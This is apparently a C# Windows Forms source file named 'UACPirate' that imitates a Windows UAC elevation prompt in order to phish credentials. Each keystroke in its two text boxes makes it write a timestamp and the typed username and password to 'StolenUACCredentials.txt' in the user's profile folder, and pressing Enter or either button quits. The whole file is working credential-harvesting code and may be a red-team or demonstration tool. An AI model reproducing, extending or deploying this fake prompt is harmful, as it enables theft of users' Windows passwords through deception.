using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UACPirate
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void storeContentToDisk()
        {
            var outPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/StolenUACCredentials.txt";

            using (StreamWriter writer = new StreamWriter(outPath,true))
            {
                writer.WriteLine(DateTime.Now.ToString("yyyy-MM-ddTHH:mm:sszzz"));
                writer.WriteLine(textBox1.Text);
                writer.WriteLine(textBox2.Text);
                writer.Flush();
            }
            
        }

            private void PictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void Button1_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.Application.Exit();
        }


        private void button2_Click(object sender, EventArgs e)
        {

            System.Windows.Forms.Application.Exit();
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            storeContentToDisk();

        }
        private void quitOnEnter(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == '\n'|| e.KeyChar == '\r')
            {
                System.Windows.Forms.Application.Exit();
            }
        }


            private void textBox1_TextChanged_1(object sender, EventArgs e)
        {
            storeContentToDisk();
        }
    }
}
